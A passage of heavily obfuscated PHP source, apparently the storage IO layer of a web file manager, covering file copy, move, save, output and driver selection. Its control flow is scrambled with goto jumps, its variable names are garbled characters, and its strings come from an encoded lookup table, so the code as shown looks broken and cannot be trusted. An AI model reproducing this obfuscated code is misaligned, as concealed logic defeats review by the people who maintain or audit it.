$e…ÎĞ†ÖÀá = stripslashes($e…ÎĞ†ÖÀá); } return $e…ÎĞ†ÖÀá; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($dğºÔ…Â‡, $fàƒŞë¸¨) { $c¨Ø›¨äí = self::driverMake($fàƒŞë¸¨[0]); if (method_exists($c¨Ø›¨äí, $dğºÔ…Â‡)) { return @call_user_func_array(array($c¨Ø›¨äí, $dğºÔ…Â‡), $fàƒŞë¸¨); } if (method_exists($c¨Ø›¨äí, $_SERVER[±á õÁ][1015])) { return @call_user_func_array(array($c¨Ø›¨äí, $dğºÔ…Â‡), $fàƒŞë¸¨); } else { if (method_exists(self, $dğºÔ…Â‡)) { return @call_user_func_array(array(self, $dğºÔ…Â‡), $fàƒŞë¸¨); } else { call_user_func_array(array(parent, $dğºÔ…Â‡), $fàƒŞë¸¨); } } } public static function init($bƒ¼¶ëÓ¾¨) { return self::driverMake($bƒ¼¶ëÓ¾¨); } public static function copy($aÅ²×ÄÆ™ , $CÑ˜ƒÇ‡­‘, $fáÓ¼«×ĞÛ = false, $dìÁŒ«ƒŒš = false) { return self::copyMove($aÅ²×ÄÆ™ , $CÑ˜ƒÇ‡­‘, $fáÓ¼«×ĞÛ, $_SERVER[±á õÁ][515], $dìÁŒ«ƒŒš); } public static function move($cŸŒ³ë—Ì«, $cÅ¶½ÈìÈ™, $b¡ƒ¦•±ğ = false, $bÉÜ¼¥´¦‹ = false) { return self::copyMove($cŸŒ³ë—Ì«, $cÅ¶½ÈìÈ™, $b¡ƒ¦•±ğ, $_SERVER[±á õÁ][517], $bÉÜ¼¥´¦‹); } public static function saveFile($Aø©Œ£Úğ‡, $bÈ§ùƒÓ©í, $Cƒ¨ÚÉÄï = true) { goto D¯¾º®óºÕ; D¯¾º®óºÕ: $B¯İ­à”ô² =& $_SERVER[±á õÁ]; $aæ¸Ö°¢–ˆ = self::info($bÈ§ùƒÓ©í); $d¬¥×±õ· = self::driverMake($Aø©Œ£Úğ‡); goto dãƒ†’ï”; dâÈ‡Œ˜¹ã: $A¦²«¾¬¯© = $E”è±£æ†Û->pathFather($bÈ§ùƒÓ©í); $c’‘õ¯ÎÙ÷ = !0; if (!$Cƒ¨ÚÉÄï && self::driverIsSame($d¬¥×±õ·, $E”è±£æ†Û)) { $c’‘õ¯ÎÙ÷ = !1; } goto a·ğïŠœ¤Š; a·ğïŠœ¤Š: $dÌäÄÈßÆ = self::copyFile($d¬¥×±õ·, $Aø©Œ£Úğ‡, $E”è±£æ†Û, $A¦²«¾¬¯©, $aæ¸Ö°¢–ˆ[$B¯İ­à”ô²[38]], $c’‘õ¯ÎÙ÷); if ($eÂ—Ğá©¨¢) { $dÌäÄÈßÆ = $eÂ—Ğá©¨¢->getPathOuter($dÌäÄÈßÆ); } return $dÌäÄÈßÆ; goto aÉŠšç®¦«; dãƒ†’ï”: $E”è±£æ†Û = self::driverMake($bÈ§ùƒÓ©í); $eÂ—Ğá©¨¢ = !1; if ($E”è±£æ†Û->pathParse[$B¯İ­à”ô²[1016]]) { $aÉÆ‰İ¦ = $E”è±£æ†Û->pathParse[$B¯İ­à”ô²[1016]]; $eÂ—Ğá©¨¢ = $E”è±£æ†Û; $E”è±£æ†Û = self::driverMake($aÉÆ‰İ¦); } goto dâÈ‡Œ˜¹ã; aÉŠšç®¦«: } private static function copyMove($A —–Ïˆ…ğ, $DíÑÖõ†«, $AŠã®îäß, $F¦œæãå¿¶, $CáÆÍñ‹…ò = false) { goto B˜“¦çÑô; Bˆáº¼¾: Hook::trigger($BááÖ°½Ù[82], $EÙ©ˆ•, $A —–Ïˆ…ğ, $eÉ¯¼‘Š§, $DíÑÖõ†«); $aóÏ“šíŸÍ = self::driverIsSame($EÙ©ˆ•, $eÉ¯¼‘Š§); if ($aóÏ“šíŸÍ) { if ($F¦œæãå¿¶ == $BááÖ°½Ù[517] && !method_exists($eÉ¯¼‘Š§, $BááÖ°½Ù[1017]) && trim($DíÑÖõ†«, $BááÖ°½Ù[8]) == trim($eÉ¯¼‘Š§->pathFather($A —–Ïˆ…ğ), $BááÖ°½Ù[8])) { return $eÉ¯¼‘Š§->getPathOuter($A —–Ïˆ…ğ); } if (method_exists($eÉ¯¼‘Š§, $F¦œæãå¿¶)) { return $eÉ¯¼‘Š§->{$F¦œæãå¿¶}($A —–Ïˆ…ğ, $DíÑÖõ†«, $AŠã®îäß); } } goto C‘°îÚÍª; C‘°îÚÍª: $FåôÙ°´‹® = $EÙ©ˆ•->isFile($A —–Ïˆ…ğ); if (!$FåôÙ°´‹® && $eÉ¯¼‘Š§->getType() == $BááÖ°½Ù[719] && $EÙ©ˆ•->getType() == $BááÖ°½Ù[112]) { $eøŒ­ç¼ïÖ = $eÉ¯¼‘Š§->copyFolderFromIO($EÙ©ˆ•, $A —–Ïˆ…ğ, $DíÑÖõ†«, $AŠã®îäß, $b¶ä’†›º, $CáÆÍñ‹…ò); } else { $eøŒ­ç¼ïÖ = self::copyPath($EÙ©ˆ•, $A —–Ïˆ…ğ, $eÉ¯¼‘Š§, $DíÑÖõ†«, $AŠã®îäß, $b¶ä’†›º, $FåôÙ°´‹®, $CáÆÍñ‹…ò); } if ($eøŒ­ç¼ïÖ && $b¶ä’†›º) { $EÙ©ˆ•->remove($A —–Ïˆ…ğ); } goto aê¯àÁ©Â ; d‹“òÆ¡¥±: $EÙ©ˆ• = self::driverMake($A —–Ïˆ…ğ); $eÉ¯¼‘Š§ = self::driverMake($DíÑÖõ†«); $b¶ä’†›º = $F¦œæãå¿¶ == $BááÖ°½Ù[517]; goto d‹É²‡¿ø»; aê¯àÁ©Â : if ($DŸÙ÷èÈŠ–) { $eøŒ­ç¼ïÖ = $DŸÙ÷èÈŠ–->getPathOuter($eøŒ­ç¼ïÖ); } return $eøŒ­ç¼ïÖ; goto e—ëÕõÑªæ; B˜“¦çÑô: $BááÖ°½Ù =& $_SERVER[±á õÁ]; if (!$A —–Ïˆ…ğ || $A —–Ïˆ…ğ == $BááÖ°½Ù[8] || !$DíÑÖõ†«) { return !1; } ignore_timeout(); goto d‹“òÆ¡¥±; d‹É²‡¿ø»: $DŸÙ÷èÈŠ– = !1; if ($eÉ¯¼‘Š§->pathParse[$BááÖ°½Ù[1016]]) { $DíÑÖõ†« = $eÉ¯¼‘Š§->pathParse[$BááÖ°½Ù[1016]]; $DŸÙ÷èÈŠ– = $eÉ¯¼‘Š§; $eÉ¯¼‘Š§ = self::driverMake($DíÑÖõ†«); } self::check($EÙ©ˆ•, $A —–Ïˆ…ğ, $eÉ¯¼‘Š§, $DíÑÖõ†«); goto Bˆáº¼¾; e—ëÕõÑªæ: } private static function check($Aæ‰Ë‹îƒ, $fŸªÖ¨—, $Bø¢‚Û†°Ú, &$d©äï«ÆÈ) { $bİÌó™ˆ¸§ =& $_SERVER[±á õÁ]; if (self::driverIsSame($Aæ‰Ë‹îƒ, $Bø¢‚Û†°Ú) && $Aæ‰Ë‹îƒ->isFolder($fŸªÖ¨—) && $Aæ‰Ë‹îƒ->isParentOf($fŸªÖ¨—, $d©äï«ÆÈ)) { show_json(LNG($bİÌó™ˆ¸§[1018]), !1); } if (!$Aæ‰Ë‹îƒ->exist($fŸªÖ¨—)) { show_json(LNG($bİÌó™ˆ¸§[111]), !1); } } private static function copyPath($dßÓ¢‰ô¢Ù, $Fª õÍ™äÙ, $E…£‘¯Â…«, $bŒŠá‡Õëç, $f… ‚”†Ê, $B­‘ŸÊîÆ¥, $Dº©æ§Ş–¨, $b¡¾Ş‡—õİ = false) { goto cíÌ¬Ûï´¯; AÚñÍ„ïÄ‚: $a»³Ï”ˆªñ = $E…£‘¯Â…«->mkdir($E…£‘¯Â…«->getPath($aÁò Ç«ÙÑ)); $bŒŠá‡Õëç = $E…£‘¯Â…«->getPathInner($a»³Ï”ˆªñ); $ağÃî¯ßÀ = $dßÓ¢‰ô¢Ù->listPath($Fª õÍ™äÙ, !0); goto F‘×è‘Íª; cíÌ¬Ûï´¯: $b‡˜Ò‹ó =& $_SERVER[±á õÁ]; $FÙªÒîø«é = $b¡¾Ş‡—õİ ? $b¡¾Ş‡—õİ : $dßÓ¢‰ô¢Ù->getPathName($dßÓ¢‰ô¢Ù->pathThis($Fª õÍ™äÙ)); if ($f… ‚”†Ê) { $f¢ãñˆ‚ù¾ = $E…£‘¯Â…«->fileNameExist($bŒŠá‡Õëç, $FÙªÒîø«é); $FÙªÒîø«é = $E…£‘¯Â…«->fileNameAuto($bŒŠá‡Õëç, $FÙªÒîø«é, $f… ‚”†Ê, !$Dº©æ§Ş–¨); $f… ‚”†Ê = $f¢ãñˆ‚ù¾ ? $f… ‚”†Ê : !1; } goto dØÑ¹¶”Äˆ; dØÑ¹¶”Äˆ: if ($Dº©æ§Ş–¨) { return self::copyFile($dßÓ¢‰ô¢Ù, $Fª õÍ™äÙ, $E…£‘¯Â…«, $bŒŠá‡Õëç, $FÙªÒîø«é, $B­‘ŸÊîÆ¥); } if ($f… ‚”†Ê == REPEAT_RENAME_FOLDER) { $f… ‚”†Ê = !1; } $aÁò Ç«ÙÑ = rtrim($bŒŠá‡Õëç, $b‡˜Ò‹ó[8]) . $b‡˜Ò‹ó[8] . $FÙªÒîø«é; goto AÚñÍ„ïÄ‚; F‘×è‘Íª: $cœéªÎäÏ = array_merge($ağÃî¯ßÀ[$b‡˜Ò‹ó[83]], $ağÃî¯ßÀ[$b‡˜Ò‹ó[84]]); foreach ($cœéªÎäÏ as $Eï×äİ¯¿±) { $B­­ª¬å = $Eï×äİ¯¿±[$b‡˜Ò‹ó[39]] == $b‡˜Ò‹ó[181]; $Fª õÍ™äÙ = $dßÓ¢‰ô¢Ù->getPathInner($Eï×äİ¯¿±[$b‡˜Ò‹ó[85]]); $fË„é‹­õç = self::copyPath($dßÓ¢‰ô¢Ù, $Fª õÍ™äÙ, $E…£‘¯Â…«, $bŒŠá‡Õëç, $f… ‚”†Ê, $B­‘ŸÊîÆ¥, $B­­ª¬å); if (!$fË„é‹­õç) { write_log($b‡˜Ò‹ó[1019] . $Fª õÍ™äÙ . $b‡˜Ò‹ó[1020] . $bŒŠá‡Õëç, $b‡˜Ò‹ó[1021]); } } return $a»³Ï”ˆªñ; goto a¬ºòõË„; a¬ºòõË„: } private static function copyFile($eš‡å¬‹Ÿ©, $dªµè†‡‹÷, $AÊÒ¢™Œñ, $Càèõ…İ›, $aˆöÙ˜¨¢¹, $E²´ø‚“Ù) { goto b…Õëâ§È‚; Dğ„„µ¾ÏÇ: mk_dir($eÅá÷‚ö®¨); $e¹‡¹ïÄ÷Í = $eÅá÷‚ö®¨ . $dãÒñß¥†¿; $e¹‡¹ïÄ÷Í = $eš‡å¬‹Ÿ©->download($dªµè†‡‹÷, $e¹‡¹ïÄ÷Í); goto b‹ôìÆÏ‡¹; bï„ó‚ì‡Î: Hook::trigger($BŸ»ÇšŸ²[1023], $eš‡å¬‹Ÿ©, $dªµè†‡‹÷, $AÊÒ¢™Œñ, $Càèõ…İ›, $aˆöÙ˜¨¢¹, $dãÒñß¥†¿); if (self::driverIsSame($eš‡å¬‹Ÿ©, $AÊÒ¢™Œñ)) { if ($E²´ø‚“Ù) { $D‡·¥èÖ… = $AÊÒ¢™Œñ->moveFile($dªµè†‡‹÷, $Càèõ…İ›); } else { $D‡·¥èÖ… = $AÊÒ¢™Œñ->copyFile($dªµè†‡‹÷, $Càèõ…İ›); } Hook::trigger($BŸ»ÇšŸ²[1024], $eš‡å¬‹Ÿ©, $dªµè†‡‹÷, $AÊÒ¢™Œñ, $Càèõ…İ›, $aˆöÙ˜¨¢¹, $D‡·¥èÖ…); return $D‡·¥èÖ…; } $eÅá÷‚ö®¨ = TEMP_FILES; goto Dğ„„µ¾ÏÇ; E‹¬÷ÅÈêÊ: Hook::trigger($BŸ»ÇšŸ²[1024], $eš‡å¬‹Ÿ©, $dªµè†‡‹÷, $AÊÒ¢™Œñ, $Càèõ…İ›, $aˆöÙ˜¨¢¹, $D‡·¥èÖ…); return $D‡·¥èÖ…; goto cÍ›È¸í¹; b‹ôìÆÏ‡¹: $e¹‡¹ïÄ÷Í = $eš‡å¬‹Ÿ©->iconvApp($e¹‡¹ïÄ÷Í); $D‡·¥èÖ… = $AÊÒ¢™Œñ->upload($Càèõ…İ›, $e¹‡¹ïÄ÷Í, $E²´ø‚“Ù); self::remove($eÅá÷‚ö®¨ . $dãÒñß¥†¿); goto E‹¬÷ÅÈêÊ; b…Õëâ§È‚: $BŸ»ÇšŸ² =& $_SERVER[±á õÁ]; $Càèõ…İ› = $AÊÒ¢™Œñ->getPath(rtrim($Càèõ…İ›, $BŸ»ÇšŸ²[8]) . $BŸ»ÇšŸ²[8] . $aˆöÙ˜¨¢¹); $dãÒñß¥†¿ = $BŸ»ÇšŸ²[1022] . time() . rand_string(5); goto bï„ó‚ì‡Î; cÍ›È¸í¹: } public static function pathFather($F·æ²—ÅÜ) { $A‘áò¹ƒÌÓ = IO::init($F·æ²—ÅÜ); $Eôœï°©¿ = $A‘áò¹ƒÌÓ->pathFather($A‘áò¹ƒÌÓ->path); return $A‘áò¹ƒÌÓ->getPathOuter($Eôœï°©¿); } public static function fileOut($DïîÇÀÇ¹±, $Bµ‚šñ÷¥ = false, $ağ¦íÕ»›Ø = false, $FªÂùå¯º× = '') { $eÃŞ²ÚñÂ¶ = self::driverMake($DïîÇÀÇ¹±); if ($eÃŞ²ÚñÂ¶->isFileOutServer()) { return $eÃŞ²ÚñÂ¶->fileOutServer($DïîÇÀÇ¹±, $Bµ‚šñ÷¥, $ağ¦íÕ»›Ø, $FªÂùå¯º×); } return $eÃŞ²ÚñÂ¶->fileOut($DïîÇÀÇ¹±, $Bµ‚šñ÷¥, $ağ¦íÕ»›Ø, $FªÂùå¯º×); } public static function fileOutImage($aæÅíË¥¯‡, $fêŠìÔ– = 250) { $D©‘†ÁŒîË = array(250, 600, 1200, 3000, 5000); for ($Bæ³ƒ‹´‡Ù = 0; $Bæ³ƒ‹´‡Ù < count($D©‘†ÁŒîË); $Bæ³ƒ‹´‡Ù++) { if ($Bæ³ƒ‹´‡Ù == 0 && $fêŠìÔ– <= $D©‘†ÁŒîË[$Bæ³ƒ‹´‡Ù]) { $fêŠìÔ– = $D©‘†ÁŒîË[$Bæ³ƒ‹´‡Ù]; break; } else { if ($fêŠìÔ– > $D©‘†ÁŒîË[$Bæ³ƒ‹´‡Ù - 1] && $fêŠìÔ– <= $D©‘†ÁŒîË[$Bæ³ƒ‹´‡Ù]) { $fêŠìÔ– = $D©‘†ÁŒîË[$Bæ³ƒ‹´‡Ù]; break; } else { if ($Bæ³ƒ‹´‡Ù == count($D©‘†ÁŒîË) - 1 && $fêŠìÔ– > $D©‘†ÁŒîË[$Bæ³ƒ‹´‡Ù]) { $fêŠìÔ– = $D©‘†ÁŒîË[$Bæ³ƒ‹´‡Ù]; break; } } } } $AĞß¤¤‹Î½ = self::driverMake($aæÅíË¥¯‡); if ($AĞß¤¤‹Î½->isFileOutServer()) { return $AĞß¤¤‹Î½->fileOutImageServer($aæÅíË¥¯‡, $fêŠìÔ–); } return $AĞß¤¤‹Î½->fileOutImage($aæÅíË¥¯‡, $fêŠìÔ–); } private static function driverIsSame($f²öè‡°šö, $c¢ôÕ°Â¢) { goto fõ„„ÁÜ‘ò; c®æ³ŞÈ÷‚: if ($cò…š˜Á¡í != $dèÏˆ¬Çƒ–) { return !1; } if ($cò…š˜Á¡í == $D¦ö³ß˜Ú¾[719]) { return !0; } if ($cò…š˜Á¡í == $D¦ö³ß˜Ú¾[112]) { return !0; } goto EˆêáËøª‰; EˆêáËøª‰: if ($f²öè‡°šö->pathDriver == $c¢ôÕ°Â¢->pathDriver) { return !0; } return !1; goto B¸Ïí; fõ„„ÁÜ‘ò: $D¦ö³ß˜Ú¾ =& $_SERVER[±á õÁ]; $cò…š˜Á¡í = $f²öè‡°šö->getType(); $dèÏˆ¬Çƒ– = $c¢ôÕ°Â¢->getType(); goto c®æ³ŞÈ÷‚; B¸Ïí: } public static function copyUpdate($D¹á ñ¡Ä, $B˜‚‰–Ò§™) { goto d×¢áîšš; d×¢áîšš: $Eòù£­¡¨ =& $_SERVER[±á õÁ]; if (!IO::exist($D¹á ñ¡Ä)) { return !1; } if (!IO::exist($B˜‚‰–Ò§™)) { IO::mkdir($B˜‚‰–Ò§™); } goto D˜‘Ä¨³ÆŠ; dïÖæÙ§: Hook::trigger($Eòù£­¡¨[1028], $D¹á ñ¡Ä, $B˜‚‰–Ò§™, $Bä©ÌŞ’¯); foreach ($Dƒ¾‹¡ŞÍ™ as $aä¬æÑŞÆ) { IO::mkdir($aä¬æÑŞÆ); } foreach ($dÎÃóÃ¶“ as $aä¬æÑŞÆ) { IO::copy($aä¬æÑŞÆ[$Eòù£­¡¨[1025]], $aä¬æÑŞÆ[$Eòù£­¡¨[1026]], REPEAT_REPLACE); } goto B–ß÷‘¾î¿; D˜‘Ä¨³ÆŠ: $Eï±¾è–›ã = self::_listAll($D¹á ñ¡Ä); $c†‹öİÁ = self::_listAll($B˜‚‰–Ò§™); $dÎÃóÃ¶“ = array(); goto AßÙƒµÖ¡; AßÙƒµÖ¡: $Dƒ¾‹¡ŞÍ™ = array(); foreach ($Eï±¾è–›ã as $D‚óÆ± ª => $aä¬æÑŞÆ) { if (isset($c†‹öİÁ[$D‚óÆ± ª])) { if ($aä¬æÑŞÆ[$Eòù£­¡¨[86]] == 1) { continue; } if ($c†‹öİÁ[$D‚óÆ± ª][$Eòù£­¡¨[87]] == $aä¬æÑŞÆ[$Eòù£­¡¨[87]]) { continue; } } if ($aä¬æÑŞÆ[$Eòù£­¡¨[86]] == 1) { $Dƒ¾‹¡ŞÍ™[] = $B˜‚‰–Ò§™ . $Eòù£­¡¨[8] . $D‚óÆ± ª; continue; } $AÖ Šß“ = strstr(trim($D‚óÆ± ª, $Eòù£­¡¨[8]), $Eòù£­¡¨[8]) ? get_path_father($D‚óÆ± ª) : $Eòù£­¡¨[43]; $dÎÃóÃ¶“[] = array($Eòù£­¡¨[1025] => $aä¬æÑŞÆ[$Eòù£­¡¨[85]], $Eòù£­¡¨[1026] => rtrim($B˜‚‰–Ò§™, $Eòù£­¡¨[8]) . $Eòù£­¡¨[8] . $AÖ Šß“, $Eòù£­¡¨[1027] => $aä¬æÑŞÆ); } $Bä©ÌŞ’¯ = array($Eòù£­¡¨[181] => $dÎÃóÃ¶“, $Eòù£­¡¨[86] => $Dƒ¾‹¡ŞÍ™); goto dïÖæÙ§; B–ß÷‘¾î¿: } private static function _listAll($AÆºŒ×Ùò) { $B®Ì“Ó‰áÆ =& $_SERVER[±á õÁ]; $AÆºŒ×Ùò = KodIO::clear($AÆºŒ×Ùò); $cê‘Ó‡ğƒ« = IO::listAll($AÆºŒ×Ùò); foreach ($cê‘Ó‡ğƒ« as &$e¢Ö¼ÔØ¤) { $aàèÒŒìõ = substr($e¢Ö¼ÔØ¤[$B®Ì“Ó‰áÆ[85]], strlen($AÆºŒ×Ùò)); $e¢Ö¼ÔØ¤[$B®Ì“Ó‰áÆ[1029]] = trim($aàèÒŒìõ, $B®Ì“Ó‰áÆ[8]); } unset($e¢Ö¼ÔØ¤); return array_to_keyvalue($cê‘Ó‡ğƒ«, $B®Ì“Ó‰áÆ[1029]); } public static function fileSubstr($dŠ›÷¼Èñ, $BŸŸ¹Ò´ª, $Cóˆ’™ØéË = false) { goto cå‰¶ø‰‚è; cå‰¶ø‰‚è: $A‘Ä¡§‹ïÏ =& $_SERVER[±á õÁ]; $a¬ÊŠìô× = self::driverMake($dŠ›÷¼Èñ); $A÷•›™ÍÅ° = $a¬ÊŠìô×->size($dŠ›÷¼Èñ); goto ašÌÉñ¾ÏÊ; ašÌÉñ¾ÏÊ: $CĞºò”Ó®® = $BŸŸ¹Ò´ª; $e¹˜‘¤¥“£ = $Cóˆ’™ØéË; if ($BŸŸ¹Ò´ª < 0) { $BŸŸ¹Ò´ª = $A÷•›™ÍÅ° + $BŸŸ¹Ò´ª; } goto Aè¤‰’òï†; E‹‹™†…Ùî: if (!$D¥òİâ¸ˆ && $Cóˆ’™ØéË && isset($GLOBALS[$A‘Ä¡§‹ïÏ[1032]])) { throw new Exception($GLOBALS[$A‘Ä¡§‹ïÏ[1032]][$A‘Ä¡§‹ïÏ[1033]]); } return $D¥òİâ¸ˆ; goto e¢°Ïó³×Š; Aè¤‰’òï†: if ($Cóˆ’™ØéË === !1) { $Cóˆ’™ØéË = $A÷•›™ÍÅ° - $BŸŸ¹Ò´ª; } if ($BŸŸ¹Ò´ª + $Cóˆ’™ØéË > $A÷•›™ÍÅ°) { $Cóˆ’™ØéË = $A÷•›™ÍÅ° - $BŸŸ¹Ò´ª; } if (!$A÷•›™ÍÅ° && $a¬ÊŠìô×->getType() == $A‘Ä¡§‹ïÏ[112] && !$a¬ÊŠìô×->exist($dŠ›÷¼Èñ)) { throw new Exception($A‘Ä¡§‹ïÏ[1030] . LNG($A‘Ä¡§‹ïÏ[1031])); } goto f¢£¾‹£½; f¢£¾‹£½: if ($Cóˆ’™ØéË <= 0) { return $A‘Ä¡§‹ïÏ[43]; } if ($BŸŸ¹Ò´ª < 0 || $BŸŸ¹Ò´ª >= $A÷•›™ÍÅ° || $Cóˆ’™ØéË > 1024 * 1024 * 5) { throw new Exception("\146\x69\x6c\x65\x52\145\141\x64\x20\145\x72\162\x6f\x72\41\40\163\x74\x61\x72\164\75{$BŸŸ¹Ò´ª}\x3b\x6c\145\156\147\x74\x68\x3d{$Cóˆ’™ØéË}\x3b\x20\x73\x69\x7a\145\x3d{$A÷•›™ÍÅ°}\73"); } $D¥òİâ¸ˆ = $a¬ÊŠìô×->fileSubstr($dŠ›÷¼Èñ, $BŸŸ¹Ò´ª, $Cóˆ’™ØéË); goto E‹‹™†…Ùî; e¢°Ïó³×Š: } private static function driverMake(&$Bã‘æŞ—© ) { goto dò¬çÌÃã³; dò¬çÌÃã³: $A—ÂÒãÌÔ =& $_SERVER[±á õÁ]; $Dñ“Šİñ¿º = KodIO::parse($Bã‘æŞ—© ); if (!self::$driverListSystem) { $CÙà…ĞÊÊÑ = Model($A—ÂÒãÌÔ[728])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($CÙà…ĞÊÊÑ, $A—ÂÒãÌÔ[391]); } goto DÈºğ¯àƒ¹; e…ƒ˜¥º: return $D°Â¾ ß; goto eŠõ˜×Õê«; DÈºğ¯àƒ¹: if ($Dñ“Šİñ¿º[$A—ÂÒãÌÔ[39]] == KodIO::KOD_IO && !self::$driverListSystem[$Dñ“Šİñ¿º[$A—ÂÒãÌÔ[391]]]) { return !1; } $Bã‘æŞ—©  = $Dñ“Šİñ¿º[$A—ÂÒãÌÔ[1034]]; $D°Â¾ ß = self::driverGet($Dñ“Šİñ¿º, $Bã‘æŞ—© ); goto e…ƒ˜¥º; eŠõ˜×Õê«: } private static function driverGet($a¶øñ‘†®š, &$D—›÷²ÑİÔ) { goto bë‘ƒ•Ò; bë‘ƒ•Ò: $DçõËùší =& $_SERVER[±á õÁ]; $C›µå²˜¹• = $a¶øñ‘†®š[$DçõËùší[1035]]; $føİ†å¸¹ = $a¶øñ‘†®š[$DçõËùší[391]]; goto B’Àš©…¾¼; B’Àš©…¾¼: switch ($a¶øñ‘†®š[$DçõËùší[39]]) { case KodIO::KOD_IO: $båëÂ—Çù = self::$driverListSystem[$føİ†å¸¹]; break; case KodIO::KOD_SOURCE: $D—›÷²ÑİÔ = $føİ†å¸¹ . $D—›÷²ÑİÔ; $båëÂ—Çù = array($DçõËùší[1036] => $DçõËùší[1037], $DçõËùší[6] => $a¶øñ‘†®š); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $D´êÛ®óÓĞ = $GLOBALS[$DçõËùší[1038]]; self::$driverListUser = array_to_keyvalue($D´êÛ®óÓĞ, $DçõËùší[391]); } $båëÂ—Çù = self::$driverListUser[$føİ†å¸¹]; break; case KodIO::KOD_SHARE_LINK: $båëÂ—Çù = array($DçõËùší[1036] => $DçõËùší[1039], $DçõËùší[6] => $a¶øñ‘†®š); $BŠ§ÆØá = Action($DçõËùší[1040])->sharePathInfo($a¶øñ‘†®š[$DçõËùší[85]]); $D—›÷²ÑİÔ = $BŠ§ÆØá[$DçõËùší[393]]; if (!$BŠ§ÆØá[$DçõËùší[393]]) { $bÚ…ãĞ„Œ = Model($DçõËùší[560])->getInfo($BŠ§ÆØá[$DçõËùší[464]]); $D—›÷²ÑİÔ = KodIO::clear($bÚ…ãĞ„Œ[$DçõËùší[1041]] . $a¶øñ‘†®š[$DçõËùší[1034]]); $a¶øñ‘†®š[$DçõËùší[462]] = $bÚ…ãĞ„Œ; $a¶øñ‘†®š[$DçõËùší[1016]] = $D—›÷²ÑİÔ; $båëÂ—Çù = array($DçõËùší[1036] => $DçõËùší[1042], $DçõËùší[6] => $a¶øñ‘†®š); } break; case KodIO::KOD_SHARE_ITEM: $båëÂ—Çù = array($DçõËùší[1036] => $DçõËùší[1043], $DçõËùší[6] => $a¶øñ‘†®š); $bÚ…ãĞ„Œ = Model($DçõËùší[560])->getInfo($a¶øñ‘†®š[$DçõËùší[391]]); if ($bÚ…ãĞ„Œ[$DçõËùší[393]] == $DçõËùší[493]) { $D—›÷²ÑİÔ = KodIO::clear($bÚ…ãĞ„Œ[$DçõËùší[1041]] . $a¶øñ‘†®š[$DçõËùší[1034]]); $a¶øñ‘†®š[$DçõËùší[462]] = $bÚ…ãĞ„Œ; $a¶øñ‘†®š[$DçõËùší[1016]] = $D—›÷²ÑİÔ; $båëÂ—Çù = array($DçõËùší[1036] => $DçõËùší[1044], $DçõËùší[6] => $a¶øñ‘†®š); } else { if (!$D—›÷²ÑİÔ) { $D—›÷²ÑİÔ = $bÚ…ãĞ„Œ[$DçõËùší[393]]; } } break; default: $D—›÷²ÑİÔ = $a¶øñ‘†®š[$DçõËùší[85]]; $båëÂ—Çù = array($DçõËùší[1036] => $DçõËùší[1045]); break; } $BÖÏ¹Éºä¤ = $a¶øñ‘†®š[$DçõËùší[85]]; if (!isset(self::$driverCache[$BÖÏ¹Éºä¤])) { $E‹„¢™·„‚ = strtolower($båëÂ—Çù[$DçõËùší[100]]); $FÌ©Î¾ÂÊ = $GLOBALS[$DçõËùší[6]][$DçõËùší[94]][$DçõËùší[777]]; $bÂìÚª¦½Š = $DçõËùší[81] . (isset($FÌ©Î¾ÂÊ[$E‹„¢™·„‚]) ? $FÌ©Î¾ÂÊ[$E‹„¢™·„‚] : ucfirst($E‹„¢™·„‚)); if (!class_exists($bÂìÚª¦½Š)) { show_json("{$bÂìÚª¦½Š}\x20\156\157\x74\40\145\170\151\x73\164\163\41", !1); } $Fİ¤¯ÉŒíÕ = isset($båëÂ—Çù[$DçõËùší[6]]) ? $båëÂ—Çù[$DçõËùší[6]] : !1; self::$driverCache[$BÖÏ¹Éºä¤] = new $bÂìÚª¦½Š($Fİ¤¯ÉŒíÕ); } goto FîË¡Õ‡ƒö; FîË¡Õ‡ƒö: $Cªêù¸¥ÛÓ = self::$driverCache[$BÖÏ¹Éºä¤]; $Cªêù¸¥ÛÓ->pathDriver = $C›µå²˜¹•; $Cªêù¸¥ÛÓ->pathBase = $DçõËùší[43]; goto Cšò»ÜÎ…í; c‡’ÕËèÖ×: $Cªêù¸¥ÛÓ->path = $D—›÷²ÑİÔ; return $Cªêù¸¥ÛÓ; goto D›„Í‰Ç£ô; Cšò»ÜÎ…í: if (isset($båëÂ—Çù[$DçõËùší[6]][$DçõËùší[1046]])) { $Cªêù¸¥ÛÓ->pathBase = rtrim($båëÂ—Çù[$DçõËùší[6]][$DçõËùší[1046]], $DçõËùší[8]) . $DçõËùší[8]; $D—›÷²ÑİÔ = $Cªêù¸¥ÛÓ->pathBase . ltrim($D—›÷²ÑİÔ, $DçõËùší[8]); } $D—›÷²ÑİÔ = $Cªêù¸¥ÛÓ->getPath($D—›÷²ÑİÔ); if (isset($a¶øñ‘†®š[$DçõËùší[1016]])) { $D—›÷²ÑİÔ = $a¶øñ‘†®š[$DçõËùší[1016]]; } goto c‡’ÕËèÖ×; D›„Í‰Ç£ô: } } goto DÜÃ‰ÄÀœ¢; a°ê‚«‹: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Fê¸‹ƒ¿Ó = false, $bÆŞÇÄÂÚÍ = '', $FŸÎ”±½ò˜ = false) { goto fÈšæ¡Ù¨¶; A‘¨œÔ´‹ñ: $this->cacheSet($bÆŞÇÄÂÚÍ, $F‘¶¨¼ëß); $F‘¶¨¼ëß = array_merge($f„Øãó²Ùñ, $F‘¶¨¼ëß); return $Fê¸‹ƒ¿Ó ? $F‘¶¨¼ëß[$Fê¸‹ƒ¿Ó] : $F‘¶¨¼ëß; goto fÒÙÑåˆ; DÖƒÏºÈ‰¹: $f„Øãó²Ùñ = is_array($f„Øãó²Ùñ) ? $f„Øãó²Ùñ : array(); if (is_array($F‘¶¨¼ëß)) { $F‘¶¨¼ëß = array_merge($f„Øãó²Ùñ, $F‘¶¨¼ëß); return $Fê¸‹ƒ¿Ó ? isset($F‘¶¨¼ëß[$Fê¸‹ƒ¿Ó]) ? $F‘¶¨¼ëß[$Fê¸‹ƒ¿Ó] : null : $F‘¶¨¼ëß; } $Añ×ê·³‹ = $this->filterWhere(array($c¢É…°Ó–[39] => $bÆŞÇÄÂÚÍ)); goto aš¹öÒ²; aš¹öÒ²: $F‘¶¨¼ëß = $this->where($Añ×ê·³‹)->select(); $F‘¶¨¼ëß = array_to_keyvalue($F‘¶¨¼ëß, $c¢É…°Ó–[99], $c¢É…°Ó–[375]); foreach ($F‘¶¨¼ëß as 